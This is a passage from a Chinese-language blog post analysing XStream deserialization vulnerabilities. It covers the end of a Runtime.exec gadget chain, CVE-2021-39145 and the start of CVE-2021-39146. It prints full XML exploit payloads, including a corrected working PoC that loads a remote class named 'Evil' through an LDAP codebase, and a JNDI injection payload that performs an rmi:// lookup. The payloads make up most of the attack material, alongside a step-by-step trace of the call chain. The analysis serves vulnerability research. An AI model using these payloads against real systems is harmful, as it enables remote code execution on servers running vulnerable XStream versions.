&lt;sun.tracing.dtrace.DTraceProbe&gt;</span><br><span class="line">              &lt;proxy class=&#x27;java.lang.Runtime&#x27;/&gt;</span><br><span class="line">              &lt;implementing__method&gt;</span><br><span class="line">                &lt;class&gt;java.lang.Runtime&lt;/class&gt;</span><br><span class="line">                &lt;name&gt;exec&lt;/name&gt;</span><br><span class="line">                &lt;parameter-types&gt;</span><br><span class="line">                  &lt;class&gt;java.lang.String&lt;/class&gt;</span><br><span class="line">                &lt;/parameter-types&gt;</span><br><span class="line">              &lt;/implementing__method&gt;</span><br><span class="line">            &lt;/sun.tracing.dtrace.DTraceProbe&gt;</span><br><span class="line">          &lt;/entry&gt;</span><br><span class="line">        &lt;/probes&gt;</span><br><span class="line">      &lt;/handler&gt;</span><br><span class="line">    &lt;/dynamic-proxy&gt;</span><br><span class="line">    &lt;string&gt;calc&lt;/string&gt;</span><br><span class="line">  &lt;/java.util.PriorityQueue&gt;</span><br><span class="line">&lt;/java.util.PriorityQueue&gt;</span><br></pre></td></tr></table></figure>

<p>直接哭了，这么短的链好久没见到了，之前XStream将命令执行的ProcessBuilder加入了黑名单，就是Runtime没加，这次就是用Runtime执行的命令。</p>
<p>这里直接来到invoke，同样还是compareTo方法触发的invoke：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304131443932.png" alt="image-20230413144356849"></p>
<p>在invoke方法中，判断compareTo所属的类是否与providerType属性相同，相同的话进入else分支调用triggerProbe方法。</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304131446934.png" alt="image-20230413144606848"></p>
<p>获取compareTo方法的ProbeSkeleton值，然后调用该值的uncheckedTrigger方法将字符串calc传递。</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304131447358.png" alt="image-20230413144751294"></p>
<p>直接执行Runtime的exec方法，完成命令执行。很巧妙的设计。</p>
<h2 id="CVE-2021-39145"><a href="#CVE-2021-39145" class="headerlink" title="CVE-2021-39145"></a>CVE-2021-39145</h2><h3 id="分析-22"><a href="#分析-22" class="headerlink" title="分析"></a>分析</h3><p>该漏洞会从远程codebase拉取class，然后实例化类，造成RCE。官方POC如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;java.util.PriorityQueue serialization=&#x27;custom&#x27;&gt;</span><br><span class="line">  &lt;unserializable-parents/&gt;</span><br><span class="line">  &lt;java.util.PriorityQueue&gt;</span><br><span class="line">    &lt;default&gt;</span><br><span class="line">      &lt;size&gt;2&lt;/size&gt;</span><br><span class="line">    &lt;/default&gt;</span><br><span class="line">    &lt;int&gt;3&lt;/int&gt;</span><br><span class="line">    &lt;javax.naming.ldap.Rdn_-RdnEntry&gt;</span><br><span class="line">      &lt;type&gt;12345&lt;/type&gt;</span><br><span class="line">      &lt;value class=&#x27;com.sun.org.apache.xpath.internal.objects.XString&#x27;&gt;</span><br><span class="line">        &lt;m__obj class=&#x27;string&#x27;&gt;com.sun.xml.internal.ws.api.message.Packet@2002fc1d Content: &amp;#x3C;none&amp;#x3E;&lt;/m__obj&gt;</span><br><span class="line">      &lt;/value&gt;</span><br><span class="line">    &lt;/javax.naming.ldap.Rdn_-RdnEntry&gt;</span><br><span class="line">    &lt;javax.naming.ldap.Rdn_-RdnEntry&gt;</span><br><span class="line">      &lt;type&gt;12345&lt;/type&gt;</span><br><span class="line">      &lt;value class=&#x27;com.sun.xml.internal.ws.api.message.Packet&#x27; serialization=&#x27;custom&#x27;&gt;</span><br><span class="line">        &lt;message class=&#x27;com.sun.xml.internal.ws.message.saaj.SAAJMessage&#x27;&gt;</span><br><span class="line">          &lt;parsedMessage&gt;true&lt;/parsedMessage&gt;</span><br><span class="line">          &lt;soapVersion&gt;SOAP_11&lt;/soapVersion&gt;</span><br><span class="line">          &lt;bodyParts/&gt;</span><br><span class="line">          &lt;sm class=&#x27;com.sun.xml.internal.messaging.saaj.soap.ver1_1.Message1_1Impl&#x27;&gt;</span><br><span class="line">            &lt;attachmentsInitialized&gt;false&lt;/attachmentsInitialized&gt;</span><br><span class="line">            &lt;multiPart class=&#x27;com.sun.xml.internal.messaging.saaj.packaging.mime.internet.MimePullMultipart&#x27;&gt;</span><br><span class="line">              &lt;soapPart/&gt;</span><br><span class="line">              &lt;mm&gt;</span><br><span class="line">                &lt;it class=&#x27;com.sun.org.apache.xml.internal.security.keys.storage.implementations.KeyStoreResolver$KeyStoreIterator&#x27;&gt;</span><br><span class="line">                  &lt;aliases class=&#x27;com.sun.jndi.ldap.LdapBindingEnumeration&#x27;&gt;</span><br><span class="line">                    &lt;homeCtx&gt;</span><br><span class="line">                      &lt;hostname&gt;233.233.233.233&lt;/hostname&gt;</span><br><span class="line">                      &lt;port__number&gt;2333&lt;/port__number&gt;</span><br><span class="line">                      &lt;clnt class=&#x27;com.sun.jndi.ldap.LdapClient&#x27;/&gt;</span><br><span class="line">                    &lt;/homeCtx&gt;</span><br><span class="line">                    &lt;hasMoreCalled&gt;true&lt;/hasMoreCalled&gt;</span><br><span class="line">                    &lt;more&gt;true&lt;/more&gt;</span><br><span class="line">                    &lt;posn&gt;0&lt;/posn&gt;</span><br><span class="line">                    &lt;limit&gt;1&lt;/limit&gt;</span><br><span class="line">                    &lt;entries&gt;</span><br><span class="line">                      &lt;com.sun.jndi.ldap.LdapEntry&gt;</span><br><span class="line">                        &lt;DN&gt;uid=songtao.xu,ou=oa,dc=example,dc=com&lt;/DN&gt;</span><br><span class="line">                        &lt;attributes class=&#x27;javax.naming.directory.BasicAttributes&#x27; serialization=&#x27;custom&#x27;&gt;</span><br><span class="line">                          &lt;javax.naming.directory.BasicAttribute&gt;</span><br><span class="line">                            &lt;default&gt;</span><br><span class="line">                              &lt;ignoreCase&gt;false&lt;/ignoreCase&gt;</span><br><span class="line">                            &lt;/default&gt;</span><br><span class="line">                            &lt;int&gt;4&lt;/int&gt;</span><br><span class="line">                            &lt;javax.naming.directory.BasicAttribute serialization=&#x27;custom&#x27;&gt;</span><br><span class="line">                              &lt;javax.naming.directory.BasicAttribute&gt;</span><br><span class="line">                                &lt;default&gt;</span><br><span class="line">                                  &lt;ordered&gt;false&lt;/ordered&gt;</span><br><span class="line">                                  &lt;attrID&gt;objectClass&lt;/attrID&gt;</span><br><span class="line">                                &lt;/default&gt;</span><br><span class="line">                                &lt;int&gt;1&lt;/int&gt;</span><br><span class="line">                                &lt;string&gt;javanamingreference&lt;/string&gt;</span><br><span class="line">                              &lt;/javax.naming.directory.BasicAttribute&gt;</span><br><span class="line">                            &lt;/javax.naming.directory.BasicAttribute&gt;</span><br><span class="line">                            &lt;javax.naming.directory.BasicAttribute serialization=&#x27;custom&#x27;&gt;</span><br><span class="line">                              &lt;javax.naming.directory.BasicAttribute&gt;</span><br><span class="line">                                &lt;default&gt;</span><br><span class="line">                                  &lt;ordered&gt;false&lt;/ordered&gt;</span><br><span class="line">                                  &lt;attrID&gt;javaCodeBase&lt;/attrID&gt;</span><br><span class="line">                                &lt;/default&gt;</span><br><span class="line">                                &lt;int&gt;1&lt;/int&gt;</span><br><span class="line">                                &lt;string&gt;http://127.0.0.1:2333/&lt;/string&gt;</span><br><span class="line">                              &lt;/javax.naming.directory.BasicAttribute&gt;</span><br><span class="line">                            &lt;/javax.naming.directory.BasicAttribute&gt;</span><br><span class="line">                            &lt;javax.naming.directory.BasicAttribute serialization=&#x27;custom&#x27;&gt;</span><br><span class="line">                              &lt;javax.naming.directory.BasicAttribute&gt;</span><br><span class="line">                                &lt;default&gt;</span><br><span class="line">                                  &lt;ordered&gt;false&lt;/ordered&gt;</span><br><span class="line">                                  &lt;attrID&gt;javaClassName&lt;/attrID&gt;</span><br><span class="line">                                &lt;/default&gt;</span><br><span class="line">                                &lt;int&gt;1&lt;/int&gt;</span><br><span class="line">                                &lt;string&gt;refClassName&lt;/string&gt;</span><br><span class="line">                              &lt;/javax.naming.directory.BasicAttribute&gt;</span><br><span class="line">                            &lt;/javax.naming.directory.BasicAttribute&gt;</span><br><span class="line">                            &lt;javax.naming.directory.BasicAttribute serialization=&#x27;custom&#x27;&gt;</span><br><span class="line">                              &lt;javax.naming.directory.BasicAttribute&gt;</span><br><span class="line">                                &lt;default&gt;</span><br><span class="line">                                  &lt;ordered&gt;false&lt;/ordered&gt;</span><br><span class="line">                                  &lt;attrID&gt;javaFactory&lt;/attrID&gt;</span><br><span class="line">                                &lt;/default&gt;</span><br><span class="line">                                &lt;int&gt;1&lt;/int&gt;</span><br><span class="line">                                &lt;string&gt;Evil&lt;/string&gt;</span><br><span class="line">                              &lt;/javax.naming.directory.BasicAttribute&gt;</span><br><span class="line">                            &lt;/javax.naming.directory.BasicAttribute&gt;</span><br><span class="line">                          &lt;/javax.naming.directory.BasicAttribute&gt;</span><br><span class="line">                        &lt;/attributes&gt;</span><br><span class="line">                      &lt;/com.sun.jndi.ldap.LdapEntry&gt;</span><br><span class="line">                    &lt;/entries&gt;</span><br><span class="line">                  &lt;/aliases&gt;</span><br><span class="line">                &lt;/it&gt;</span><br><span class="line">              &lt;/mm&gt;</span><br><span class="line">            &lt;/multiPart&gt;</span><br><span class="line">          &lt;/sm&gt;</span><br><span class="line">        &lt;/message&gt;</span><br><span class="line">      &lt;/value&gt;</span><br><span class="line">    &lt;/javax.naming.ldap.Rdn_-RdnEntry&gt;</span><br><span class="line">  &lt;/java.util.PriorityQueue&gt;</span><br><span class="line">&lt;/java.util.PriorityQueue&gt;</span><br></pre></td></tr></table></figure>

<p>该POC是错的，无法直接运行，而且需要低版本的jdk（我使用的jdk8u181，我一开始使用jdk8u361没有KeyStoreResolver$KeyStoreIterator的aliases），以下是可以运行的POC：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;java.util.PriorityQueue serialization=&#x27;custom&#x27;&gt;</span><br><span class="line">  &lt;unserializable-parents/&gt;</span><br><span class="line">  &lt;java.util.PriorityQueue&gt;</span><br><span class="line">    &lt;default&gt;</span><br><span class="line">      &lt;size&gt;2&lt;/size&gt;</span><br><span class="line">    &lt;/default&gt;</span><br><span class="line">    &lt;int&gt;3&lt;/int&gt;</span><br><span class="line">    &lt;javax.naming.ldap.Rdn_-RdnEntry&gt;</span><br><span class="line">      &lt;type&gt;12345&lt;/type&gt;</span><br><span class="line">      &lt;value class=&#x27;com.sun.org.apache.xpath.internal.objects.XString&#x27;&gt;</span><br><span class="line">        &lt;m__obj class=&#x27;string&#x27;&gt;com.sun.xml.internal.ws.api.message.Packet@2002fc1d Content: &amp;#x3C;none&amp;#x3E;&lt;/m__obj&gt;</span><br><span class="line">      &lt;/value&gt;</span><br><span class="line">    &lt;/javax.naming.ldap.Rdn_-RdnEntry&gt;</span><br><span class="line">    &lt;javax.naming.ldap.Rdn_-RdnEntry&gt;</span><br><span class="line">      &lt;type&gt;12345&lt;/type&gt;</span><br><span class="line">      &lt;value class=&#x27;com.sun.xml.internal.ws.api.message.Packet&#x27; serialization=&#x27;custom&#x27;&gt;</span><br><span class="line">        &lt;message class=&#x27;com.sun.xml.internal.ws.message.saaj.SAAJMessage&#x27;&gt;</span><br><span class="line">          &lt;parsedMessage&gt;true&lt;/parsedMessage&gt;</span><br><span class="line">          &lt;soapVersion&gt;SOAP_11&lt;/soapVersion&gt;</span><br><span class="line">          &lt;bodyParts/&gt;</span><br><span class="line">          &lt;sm class=&#x27;com.sun.xml.internal.messaging.saaj.soap.ver1_1.Message1_1Impl&#x27;&gt;</span><br><span class="line">            &lt;multiPart class=&#x27;com.sun.xml.internal.messaging.saaj.packaging.mime.internet.MimePullMultipart&#x27;&gt;</span><br><span class="line">              &lt;soapPart/&gt;</span><br><span class="line">              &lt;mm&gt;</span><br><span class="line">                &lt;it class=&#x27;com.sun.org.apache.xml.internal.security.keys.storage.implementations.KeyStoreResolver$KeyStoreIterator&#x27;&gt;</span><br><span class="line">                  &lt;aliases class=&#x27;com.sun.jndi.ldap.LdapBindingEnumeration&#x27;&gt;</span><br><span class="line">                    &lt;homeCtx&gt;</span><br><span class="line">                      &lt;hostname&gt;127.0.0.1&lt;/hostname&gt;</span><br><span class="line">                      &lt;port__number&gt;2333&lt;/port__number&gt;</span><br><span class="line">                      &lt;clnt class=&#x27;com.sun.jndi.ldap.LdapClient&#x27;/&gt;</span><br><span class="line">                    &lt;/homeCtx&gt;</span><br><span class="line">                    &lt;hasMoreCalled&gt;true&lt;/hasMoreCalled&gt;</span><br><span class="line">                    &lt;more&gt;true&lt;/more&gt;</span><br><span class="line">                    &lt;posn&gt;0&lt;/posn&gt;</span><br><span class="line">                    &lt;limit&gt;1&lt;/limit&gt;</span><br><span class="line">                    &lt;entries&gt;</span><br><span class="line">                      &lt;com.sun.jndi.ldap.LdapEntry&gt;</span><br><span class="line">                        &lt;DN&gt;uid=songtao.xu,ou=oa,dc=example,dc=com&lt;/DN&gt;</span><br><span class="line">                        &lt;attributes class=&#x27;javax.naming.directory.BasicAttributes&#x27; serialization=&#x27;custom&#x27;&gt;</span><br><span class="line">                          &lt;javax.naming.directory.BasicAttributes&gt;</span><br><span class="line">                            &lt;default&gt;</span><br><span class="line">                              &lt;ignoreCase&gt;false&lt;/ignoreCase&gt;</span><br><span class="line">                            &lt;/default&gt;</span><br><span class="line">                            &lt;int&gt;4&lt;/int&gt;</span><br><span class="line">                            &lt;javax.naming.directory.BasicAttribute serialization=&#x27;custom&#x27;&gt;</span><br><span class="line">                              &lt;javax.naming.directory.BasicAttribute&gt;</span><br><span class="line">                                &lt;default&gt;</span><br><span class="line">                                  &lt;ordered&gt;false&lt;/ordered&gt;</span><br><span class="line">                                  &lt;attrID&gt;objectClass&lt;/attrID&gt;</span><br><span class="line">                                &lt;/default&gt;</span><br><span class="line">                                &lt;int&gt;1&lt;/int&gt;</span><br><span class="line">                                &lt;string&gt;javanamingreference&lt;/string&gt;</span><br><span class="line">                              &lt;/javax.naming.directory.BasicAttribute&gt;</span><br><span class="line">                            &lt;/javax.naming.directory.BasicAttribute&gt;</span><br><span class="line">                            &lt;javax.naming.directory.BasicAttribute serialization=&#x27;custom&#x27;&gt;</span><br><span class="line">                              &lt;javax.naming.directory.BasicAttribute&gt;</span><br><span class="line">                                &lt;default&gt;</span><br><span class="line">                                  &lt;ordered&gt;false&lt;/ordered&gt;</span><br><span class="line">                                  &lt;attrID&gt;javaCodeBase&lt;/attrID&gt;</span><br><span class="line">                                &lt;/default&gt;</span><br><span class="line">                                &lt;int&gt;1&lt;/int&gt;</span><br><span class="line">                                &lt;string&gt;http://127.0.0.1:2333/&lt;/string&gt;</span><br><span class="line">                              &lt;/javax.naming.directory.BasicAttribute&gt;</span><br><span class="line">                            &lt;/javax.naming.directory.BasicAttribute&gt;</span><br><span class="line">                            &lt;javax.naming.directory.BasicAttribute serialization=&#x27;custom&#x27;&gt;</span><br><span class="line">                              &lt;javax.naming.directory.BasicAttribute&gt;</span><br><span class="line">                                &lt;default&gt;</span><br><span class="line">                                  &lt;ordered&gt;false&lt;/ordered&gt;</span><br><span class="line">                                  &lt;attrID&gt;javaClassName&lt;/attrID&gt;</span><br><span class="line">                                &lt;/default&gt;</span><br><span class="line">                                &lt;int&gt;1&lt;/int&gt;</span><br><span class="line">                                &lt;string&gt;refClassName&lt;/string&gt;</span><br><span class="line">                              &lt;/javax.naming.directory.BasicAttribute&gt;</span><br><span class="line">                            &lt;/javax.naming.directory.BasicAttribute&gt;</span><br><span class="line">                            &lt;javax.naming.directory.BasicAttribute serialization=&#x27;custom&#x27;&gt;</span><br><span class="line">                              &lt;javax.naming.directory.BasicAttribute&gt;</span><br><span class="line">                                &lt;default&gt;</span><br><span class="line">                                  &lt;ordered&gt;false&lt;/ordered&gt;</span><br><span class="line">                                  &lt;attrID&gt;javaFactory&lt;/attrID&gt;</span><br><span class="line">                                &lt;/default&gt;</span><br><span class="line">                                &lt;int&gt;1&lt;/int&gt;</span><br><span class="line">                                &lt;string&gt;Evil&lt;/string&gt;</span><br><span class="line">                              &lt;/javax.naming.directory.BasicAttribute&gt;</span><br><span class="line">                            &lt;/javax.naming.directory.BasicAttribute&gt;</span><br><span class="line">                          &lt;/javax.naming.directory.BasicAttributes&gt;</span><br><span class="line">                        &lt;/attributes&gt;</span><br><span class="line">                      &lt;/com.sun.jndi.ldap.LdapEntry&gt;</span><br><span class="line">                    &lt;/entries&gt;</span><br><span class="line">                  &lt;/aliases&gt;</span><br><span class="line">                &lt;/it&gt;</span><br><span class="line">              &lt;/mm&gt;</span><br><span class="line">            &lt;/multiPart&gt;</span><br><span class="line">          &lt;/sm&gt;</span><br><span class="line">        &lt;/message&gt;</span><br><span class="line">      &lt;/value&gt;</span><br><span class="line">    &lt;/javax.naming.ldap.Rdn_-RdnEntry&gt;</span><br><span class="line">  &lt;/java.util.PriorityQueue&gt;</span><br><span class="line">&lt;/java.util.PriorityQueue&gt;</span><br></pre></td></tr></table></figure>

<p>前半部分和CVE-2021-21346很相似，前半部分的调用链如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">XString.equals</span><br><span class="line">Rdn$RdnEntry.compareTo</span><br><span class="line">Rdn$RdnEntry.compareTo</span><br><span class="line">PriorityQueue.siftDownComparable</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304131649884.png" alt="image-20230413164907785"></p>
<p>调用Packet的toString方法。</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304131651681.png" alt="image-20230413165127579"></p>
<p>调用copy方法。</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304131651949.png" alt="image-20230413165109885"></p>
<p>调用copy方法。</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304131654916.png" alt="image-20230413165434824"></p>
<p>调用getAttachments方法。</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304131656658.png" alt="image-20230413165617067"></p>
<p>创建SAAJAttachmentSet对象。</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304131657207.png" alt="image-20230413165705115"></p>
<p>调用sm（Message1_1Impl）的getAttachments方法。</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304131657254.png" alt="image-20230413165756181"></p>
<p>调用initializeAllAttachments方法。</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304131701357.png" alt="image-20230413170122277"></p>
<p>调用getCount方法。在xml中不赋值，boolean类型默认为false。</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304131702190.png" alt="image-20230413170248093"></p>
<p>调用parse方法。</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304131703750.png" alt="image-20230413170306645"></p>
<p>调用parseAll方法。</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304131704836.png" alt="image-20230413170447734"></p>
<p>在readSOAPPart方法中会为mm重新赋值，为防止为mm重新赋值，需要给soapPart赋值以防止他为空进入readSOAPPart方法，然后调用mm的getAttachments方法。</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304131706360.png" alt="image-20230413170607290"></p>
<p>接着调用parseAll方法。</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304131706487.png" alt="image-20230413170631383"></p>
<p>进入makeProgress方法。</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304131706320.png" alt="image-20230413170658249"></p>
<p>这里进入KeyStoreResolver$KeyStoreIterator的hasNext方法。</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304131708152.png" alt="image-20230413170804077"></p>
<p>接着调用findNextCert方法。</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304131709799.png" alt="image-20230413170854328"></p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304131711161.png" alt="image-20230413171150096"></p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304131712607.png" alt="image-20230413171214527"></p>
<p>判断是否有下一个值，有的话取下一个值，aliases属性为LdapBindingEnumeration。调用nextElement取下一个元素的值。</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304131712674.png" alt="image-20230413171258587"></p>
<p>nextElement方法中又调用了next方法。</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304131713955.png" alt="image-20230413171350885"></p>
<p>调用nextImpl方法。</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304131714893.png" alt="image-20230413171416806"></p>
<p>调用nextAux方法。</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304131716668.png" alt="image-20230413171621589"></p>
<p>取第一个元素的值然后递增，然后调用createItem方法，第一个元素为如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;com.sun.jndi.ldap.LdapEntry&gt;</span><br><span class="line">                        &lt;DN&gt;uid=songtao.xu,ou=oa,dc=example,dc=com&lt;/DN&gt;</span><br><span class="line">                        &lt;attributes class=&#x27;javax.naming.directory.BasicAttributes&#x27; serialization=&#x27;custom&#x27;&gt;</span><br><span class="line">                          &lt;javax.naming.directory.BasicAttributes&gt;</span><br><span class="line">                            &lt;default&gt;</span><br><span class="line">                              &lt;ignoreCase&gt;false&lt;/ignoreCase&gt;</span><br><span class="line">                            &lt;/default&gt;</span><br><span class="line">                            &lt;int&gt;4&lt;/int&gt;</span><br><span class="line">                            &lt;javax.naming.directory.BasicAttribute serialization=&#x27;custom&#x27;&gt;</span><br><span class="line">                              &lt;javax.naming.directory.BasicAttribute&gt;</span><br><span class="line">                                &lt;default&gt;</span><br><span class="line">                                  &lt;ordered&gt;false&lt;/ordered&gt;</span><br><span class="line">                                  &lt;attrID&gt;objectClass&lt;/attrID&gt;</span><br><span class="line">                                &lt;/default&gt;</span><br><span class="line">                                &lt;int&gt;1&lt;/int&gt;</span><br><span class="line">                                &lt;string&gt;javanamingreference&lt;/string&gt;</span><br><span class="line">                              &lt;/javax.naming.directory.BasicAttribute&gt;</span><br><span class="line">                            &lt;/javax.naming.directory.BasicAttribute&gt;</span><br><span class="line">                            &lt;javax.naming.directory.BasicAttribute serialization=&#x27;custom&#x27;&gt;</span><br><span class="line">                              &lt;javax.naming.directory.BasicAttribute&gt;</span><br><span class="line">                                &lt;default&gt;</span><br><span class="line">                                  &lt;ordered&gt;false&lt;/ordered&gt;</span><br><span class="line">                                  &lt;attrID&gt;javaCodeBase&lt;/attrID&gt;</span><br><span class="line">                                &lt;/default&gt;</span><br><span class="line">                                &lt;int&gt;1&lt;/int&gt;</span><br><span class="line">                                &lt;string&gt;http://127.0.0.1:2333/&lt;/string&gt;</span><br><span class="line">                              &lt;/javax.naming.directory.BasicAttribute&gt;</span><br><span class="line">                            &lt;/javax.naming.directory.BasicAttribute&gt;</span><br><span class="line">                            &lt;javax.naming.directory.BasicAttribute serialization=&#x27;custom&#x27;&gt;</span><br><span class="line">                              &lt;javax.naming.directory.BasicAttribute&gt;</span><br><span class="line">                                &lt;default&gt;</span><br><span class="line">                                  &lt;ordered&gt;false&lt;/ordered&gt;</span><br><span class="line">                                  &lt;attrID&gt;javaClassName&lt;/attrID&gt;</span><br><span class="line">                                &lt;/default&gt;</span><br><span class="line">                                &lt;int&gt;1&lt;/int&gt;</span><br><span class="line">                                &lt;string&gt;refClassName&lt;/string&gt;</span><br><span class="line">                              &lt;/javax.naming.directory.BasicAttribute&gt;</span><br><span class="line">                            &lt;/javax.naming.directory.BasicAttribute&gt;</span><br><span class="line">                            &lt;javax.naming.directory.BasicAttribute serialization=&#x27;custom&#x27;&gt;</span><br><span class="line">                              &lt;javax.naming.directory.BasicAttribute&gt;</span><br><span class="line">                                &lt;default&gt;</span><br><span class="line">                                  &lt;ordered&gt;false&lt;/ordered&gt;</span><br><span class="line">                                  &lt;attrID&gt;javaFactory&lt;/attrID&gt;</span><br><span class="line">                                &lt;/default&gt;</span><br><span class="line">                                &lt;int&gt;1&lt;/int&gt;</span><br><span class="line">                                &lt;string&gt;Evil&lt;/string&gt;</span><br><span class="line">                              &lt;/javax.naming.directory.BasicAttribute&gt;</span><br><span class="line">                            &lt;/javax.naming.directory.BasicAttribute&gt;</span><br><span class="line">                          &lt;/javax.naming.directory.BasicAttributes&gt;</span><br><span class="line">                        &lt;/attributes&gt;</span><br><span class="line">                      &lt;/com.sun.jndi.ldap.LdapEntry&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304131718068.png" alt="image-20230413171816902"></p>
<p>分为上下部分，在第一个if语句中，判断BasicAttributes中的所有BasicAttribute是否存在attrID为javaClassName的，若有的话，进入if语句，然后调用decodeObject方法。</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304131722526.png" alt="image-20230413172208394"></p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304131723166.png" alt="image-20230413172355089"></p>
<p>然后回到createItem方法中：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304131718068.png" alt="image-20230413171816902"></p>
<p>然后调用<code>obj = DirectoryManager.getObjectInstance(obj, cn, homeCtx,     homeCtx.envprops, attrs);</code>方法</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304131727319.png" alt="image-20230413172724189"></p>
<p>在该方法中，将refInfo赋值给ref，然后获取工厂类名（Evil），再调用<code>getObjectFactoryFromReference</code>方法将参数传递。</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304131729062.png" alt="image-20230413172923929"></p>
<p>在getObjectFactoryFromReference方法中，先尝试本地加载，加载不到再获取远程位置，然后从远程位置加载工厂类，然后再实例化工厂类，造成任意代码执行。</p>
<h2 id="CVE-2021-39146"><a href="#CVE-2021-39146" class="headerlink" title="CVE-2021-39146"></a>CVE-2021-39146</h2><h3 id="分析-23"><a href="#分析-23" class="headerlink" title="分析"></a>分析</h3><p>该漏洞造成JNDI注入，官方POC经简化后如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;sorted-set&gt;</span><br><span class="line">  &lt;javax.naming.ldap.Rdn_-RdnEntry&gt;</span><br><span class="line">    &lt;type&gt;test&lt;/type&gt;</span><br><span class="line">    &lt;value class=&#x27;javax.swing.MultiUIDefaults&#x27; serialization=&#x27;custom&#x27;&gt;</span><br><span class="line">      &lt;unserializable-parents/&gt;</span><br><span class="line">      &lt;hashtable&gt;</span><br><span class="line">          &lt;default&gt;</span><br><span class="line">            &lt;loadFactor&gt;0.75&lt;/loadFactor&gt;</span><br><span class="line">          &lt;/default&gt;</span><br><span class="line">          &lt;int&gt;700&lt;/int&gt;</span><br><span class="line">          &lt;int&gt;0&lt;/int&gt;</span><br><span class="line">      &lt;/hashtable&gt;</span><br><span class="line">      &lt;javax.swing.MultiUIDefaults&gt;</span><br><span class="line">          &lt;default&gt;</span><br><span class="line">            &lt;tables&gt;</span><br><span class="line">            &lt;javax.swing.UIDefaults serialization=&#x27;custom&#x27;&gt;</span><br><span class="line">              &lt;unserializable-parents/&gt;</span><br><span class="line">              &lt;hashtable&gt;</span><br><span class="line">                &lt;default&gt;</span><br><span class="line">                  &lt;loadFactor&gt;0.75&lt;/loadFactor&gt;</span><br><span class="line">                &lt;/default&gt;</span><br><span class="line">                &lt;int&gt;700&lt;/int&gt;</span><br><span class="line">                &lt;int&gt;1&lt;/int&gt;</span><br><span class="line">                &lt;string&gt;lazyValue&lt;/string&gt;</span><br><span class="line">                &lt;javax.swing.UIDefaults_-ProxyLazyValue&gt;</span><br><span class="line">                  &lt;className&gt;javax.naming.InitialContext&lt;/className&gt;</span><br><span class="line">                  &lt;methodName&gt;doLookup&lt;/methodName&gt;</span><br><span class="line">                  &lt;args&gt;</span><br><span class="line">                    &lt;string&gt;rmi://127.0.0.1:1097/Object&lt;/string&gt;</span><br><span class="line">                  &lt;/args&gt;</span><br><span class="line">                &lt;/javax.swing.UIDefaults_-ProxyLazyValue&gt;</span><br><span class="line">              &lt;/hashtable&gt;</span><br><span class="line">            &lt;/javax.swing.UIDefaults&gt;</span><br><span class="line">            &lt;/tables&gt;</span><br><span class="line">          &lt;/default&gt;</span><br><span class="line">      &lt;/javax.swing.MultiUIDefaults&gt;</span><br><span class="line">    &lt;/value&gt;</span><br><span class="line">  &lt;/javax.naming.ldap.Rdn_-RdnEntry&gt;</span><br><span class="line">  &lt;javax.naming.ldap.Rdn_-RdnEntry&gt;</span><br><span class="line">    &lt;type&gt;test&lt;/type&gt;</span><br><span class="line">    &lt;value class=&#x27;com.sun.org.apache.xpath.internal.objects.XString&#x27; /&gt;</span><br><span class="line">  &lt;/javax.naming.ldap.Rdn_-RdnEntry&gt;</span><br><span class="line">&lt;/sorted-set&gt;</span><br></pre></td></tr></table></figure>

<p>这个和<a href="#CVE-2021-21346">CVE-2021-21346</a>简直一模一样，可以翻回去看看我之前对21346的分析，不同点在于如下xml：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;javax.swing.UIDefaults_-ProxyLazyValue&gt;</span><br><span class="line">	&lt;className&gt;javax.naming.InitialContext&lt;/className&gt;</span><br><span class="line">	&lt;methodName&gt;doLookup&lt;/methodName&gt;</span><br><span class="line">	&lt;args&gt;</span><br><span class="line">		&lt;string&gt;rmi://127.0.0.1:1097/Object&lt;/string&gt;</span><br><span class="line">	&lt;/args&gt;</span><br><span class="line">&lt;/javax.swing.UIDefaults_-ProxyLazyValue&gt;</span><br></pre></td></tr></table></figure>

<p>也就是在UIDefaults的getFromHashtable方法中：</p>
